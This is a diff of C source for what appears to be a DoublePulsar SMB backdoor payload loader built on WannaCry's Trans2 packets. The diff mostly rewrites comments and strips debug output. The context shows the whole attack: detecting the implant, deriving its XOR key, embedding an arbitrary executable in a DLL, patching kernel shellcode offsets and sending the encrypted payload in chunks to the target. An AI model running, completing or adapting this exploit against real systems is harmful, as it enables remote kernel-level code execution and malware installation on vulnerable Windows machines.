@@ -66,7 +66,7 @@ unsigned char SMB_TreeConnectAndX[] =
 
 unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";
 
-//Fixed Trans2 session setup PING packet.  This should work
+//Fixed SMB Trans2 session setup PING packet.  
 unsigned char trans2_request[] =
 "\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
@@ -75,7 +75,7 @@ unsigned char trans2_request[] =
 "\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00";
 
-//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
+//SMB Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
 unsigned char wannacry_Trans2_Request[] =
 "\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
@@ -439,7 +439,7 @@ int main(int argc, char* argv[])
 	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	//send Session Setup AndX request
+	//send SMB Session Setup AndX request
 	printf("sending Session_Setup_AndX_Request!\n");
 	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
@@ -447,8 +447,10 @@ int main(int argc, char* argv[])
 	//copy our returned userID value from the previous packet to the TreeConnect request packet
 	userid = *(WORD*)(recvbuff + 0x20);
 
-	//Generates a new TreeConnect request with the correct IP address
-	//rather than the hard coded one embedded in the TreeConnect string
+	/*
+	Generates a dynamic TreeConnect request with the correct IP address
+	rather than a hard coded IP address like the one embedded in the Wannacry TreeConnect packet
+	*/
 	unsigned char packet[4096];
 	unsigned char* ptr;
 	unsigned char tmp[1024];
@@ -475,16 +477,14 @@ int main(int argc, char* argv[])
 	send(sock, (char*)packet, ptr - packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	//copy the treeID from the TreeConnect response
-	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
+	//copy the treeID from the TreeConnect response to local variable
+	treeid = *(WORD*)(recvbuff + 0x1c);
 
-	//Update treeID, UserID
+	//Update treeID, UserID in the SMB trans2 ping / knock request
 	memcpy(trans2_request + 28, (unsigned char*)&treeid, 2);
 	memcpy(trans2_request + 32, (unsigned char*)&userid, 2);
-	//might need to update processid
 
-	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
-	//will return x51 or 81
+	//if DoublePulsar is enabled, the multiplex ID is incremented by 10 and will return x51 or 81
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
@@ -495,22 +495,19 @@ int main(int argc, char* argv[])
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
-	//signature[4] = recvbuff[22];
 	signature[4] = '\0';
-	//this is for determining architecture
-	//recvbuff[22];
-	//but unused at this time
+	//signature[4] = recvbuff[22];
+	//value at this offset 22 in recvbuff[22] location in the recvbuff is for determining architecture but unused at this time
 
 	//convert the signature buffer to unsigned integer 
-	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
 	sig = LE2INT(signature);
 
 	//calculate the XOR key for DoublePulsar
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
 
-	//your file path here
-	char filename[MAX_PATH] = "F:\\SPRING 2025\\stageless.bin";
+	//choose your executable here
+	char filename[MAX_PATH] = "executable.exe";
 	printf("Loading file: %s\n", filename);
 	DWORD	dwFileSizeLow = NULL;
 	DWORD	dwFileSizeHigh = NULL;
@@ -539,8 +536,10 @@ int main(int argc, char* argv[])
 
 	CloseHandle(hFile);
 
-
-	//0x50D800 = 5298176
+	/*
+	DLL size must be fixed at: 0x50D800 = 5298176 bytes.  
+	Will find a way to edit this automatically and dynamically adjust based on the size of the executable + launcher DLL
+	*/
 	DWORD DLLSIZE = 0x50D800;
 
 	//allocate memory for DLL creation
@@ -553,15 +552,12 @@ int main(int argc, char* argv[])
 
 	//add the size of the EXE after the DLL
 	*(DWORD*)&DLL[0xc8a4] = dwFileSizeLow;
-	//hexDump(NULL, (char*)&DLL[0xc8a4], 4);
 
 	//copy the EXE to the buffer, after the DWORD size value
 	memcpy((PBYTE)DLL + 0xc8a4 + 4, pExeBuffer, dwFileSizeLow);
-	//printf("MZ HEADER EXPECTED:  ");
-	//hexDump(NULL, (char*)&DLL[0xc8a4+4], 4);
 
-	//write out file here for debug purposes
 	/*
+	write out file here for debug purposes
 	HANDLE hWriteFile;
 	DWORD WriteNumberOfBytesToWrite = 0;
 	char szDest[MAX_PATH] = "D:\\STRIKE\\file.dll";
@@ -570,7 +566,6 @@ int main(int argc, char* argv[])
 	CloseHandle(hWriteFile);
 	*/
 
-
 	DWORD size = DLLSIZE;
 	int difference = size - 4 - dwFileSizeLow;
 	printf("DLL size = %d\n", size);
@@ -578,27 +573,16 @@ int main(int argc, char* argv[])
 	printf("Difference in bytes:  %d\n", difference);
 
 	printf("patching DLL + Userland shellcode size in Kernel shellcode...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 
-	//0x50D800
 	DWORD value = 0x50D800 + 3978;
+	//Patch the kernel rundll shellcode with the DLL size + kernel shellcode size
 	*(DWORD*)&kernel_rundll_shellcode[2158] = value; // 5298176 + 3978;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 
-	printf("patching DLL size...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
+	//Patch the kernel rundll shellcode with the DLL size 
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF82] = DLLSIZE;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
-	printf("patching DLL ordinal...\n");
-	printf("BEFORE:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
+
+	//Patch the kernel rundll shellcode with the ordinal of the DLL to call
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
-	printf("AFTER:  ");
-	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 
 	char process_name[256];
 	printf("Enter process name to inject DLL into (or press Enter to skip): ");
@@ -643,6 +627,7 @@ int main(int argc, char* argv[])
 	printf("will send %d packets\n ", numberofpackets);
 	printf("%d as a remainder\n", remainder);
 
+	//copy the kernel shellcode and DLL to the buffer
 	memcpy(pFULLBUFFER, kernel_rundll_shellcode, 6144);
 	memcpy(pFULLBUFFER + 6144, DLL, DLLSIZE);
 
@@ -654,6 +639,7 @@ int main(int argc, char* argv[])
 	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
 	int i;
 
+	//XOR the payload 
 	for (i = 0; i < payload_totalsize; i++)
 	{
 		pFULLBUFFER[i] ^= byte_xor_key[i % 4];
@@ -668,15 +654,12 @@ int main(int argc, char* argv[])
 	unsigned int OffsetofChunkinPayload = 0x0000;
 	int ctx;
 
-	//unsigned short smblen;
 	unsigned short smb_htons_len;
 
 	unsigned short TotalDataCount = 4096;
 	unsigned short DataCount = 4096;
 	unsigned short byteCount = 4096 + 12;
 
-	//unsigned char SMBDATA[4096];
-	//memset(SMBDATA, 0x00, 4096);
 	unsigned char* big_packet = (unsigned char*)malloc(4096 + 12 + 70);
 	int size_normal_packet = 4096 + 12 + 70;
 
@@ -697,18 +680,16 @@ int main(int argc, char* argv[])
 			Parametersbuffer[i] ^= byte_xor_key[i % 4];
 		}
 
-		//hexDump(NULL, Parametersbuffer, 12);
-
 		//copy wannacry skeleton packet to big Trans2 packet
 		memcpy((unsigned char*)big_packet, (unsigned char*)wannacry_Trans2_Request, 70);
 
 		//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 		memcpy((unsigned char*)big_packet + 70, (unsigned char*)Parametersbuffer, 12);
 
-		//copy encrypted payload
+		//copy XOR payload
 		memcpy((unsigned char*)big_packet + 82, (unsigned char*)pFULLBUFFER + ctx, ChunkSize);
 
-		//Update treeID, UserID
+		//Update treeID, UserID in the SMB trans2 execution packet 
 		memcpy((unsigned char*)big_packet + 28, (unsigned char*)&treeid, 2);
 		memcpy((unsigned char*)big_packet + 32, (unsigned char*)&userid, 2);
 
@@ -758,41 +739,42 @@ int main(int argc, char* argv[])
 		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&remainder, 4);
 		memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
+		//XOR the parameters 
 		for (i = 0; i < 13; i++)
 		{
 			Parametersbuffer[i] ^= byte_xor_key[i % 4];
 		}
 
-		//hexDump(NULL, Parametersbuffer, 12);
-
-		//copy wannacry skeleton packet to big Trans2 packet
+		//copy wannacry skeleton packet to big Trans2 packet buffer
 		memcpy((unsigned char*)last_packet, (unsigned char*)wannacry_Trans2_Request, 70);
 
-		//update size
+		//update size of the NetBIOS length in the SMB packet 
 		memcpy(last_packet + 2, &smb_htons_len, 2);
-		printf("Last packet SMB len -> ");
-		hexDump(NULL, (char*)last_packet, 4);
+		//printf("Last packet SMB len -> ");
+		//hexDump(NULL, (char*)last_packet, 4);
 
 		TotalDataCount = bytesLeft;
 		DataCount = bytesLeft;
 		byteCount = bytesLeft + 12;
 
+		//update the values 
 		*(WORD*)(last_packet + 0x27) = TotalDataCount;
 		*(WORD*)(last_packet + 0x3b) = DataCount;
 		*(WORD*)(last_packet + 0x43) = byteCount;
 
+		//update the values using memcpy 
 		memcpy((unsigned char*)last_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
 		memcpy((unsigned char*)last_packet + 0x3b, (unsigned char*)&DataCount, 2);
 		memcpy((unsigned char*)last_packet + 0x43, (unsigned char*)&byteCount, 2);
 
-		//Update treeID, UserID
+		//Update treeID, UserID in the SMB packet 
 		memcpy((unsigned char*)last_packet + 28, (unsigned char*)&treeid, 2);
 		memcpy((unsigned char*)last_packet + 32, (unsigned char*)&userid, 2);
 
 		//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 		memcpy((unsigned char*)last_packet + 70, (unsigned char*)Parametersbuffer, 12);
 
-		//copy encrypted payload
+		//copy XORed payload
 		memcpy((unsigned char*)last_packet + 82, (unsigned char*)pFULLBUFFER + ctx, remainder);
 
 		//send the payload
@@ -840,11 +822,11 @@ int main(int argc, char* argv[])
 		"\x00\x00\x00\x00\x00\x08\xff\xfe"
 		"\x00\x08\x41\x00\x00\x00\x00";
 
-	//Update treeID, UserID
+	//Update treeID, UserID in the SMB disconnect packet 
 	memcpy((unsigned char*)disconnect_packet + 28, (unsigned char*)&treeid, 2);
 	memcpy((unsigned char*)disconnect_packet + 32, (unsigned char*)&userid, 2);
 
-	//send the disconnect packet
+	//send the SMB disconnect packet
 	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
@@ -853,11 +835,11 @@ int main(int argc, char* argv[])
 		"\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff"
 		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
 
-	//Update treeID, UserID
+	//Update treeID, UserID in the SMB logoff packet 
 	memcpy((unsigned char*)logoff_packet + 28, (unsigned char*)&treeid, 2);
 	memcpy((unsigned char*)logoff_packet + 32, (unsigned char*)&userid, 2);
 
-	//send the logoff packet
+	//send the SMB logoff packet
 	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
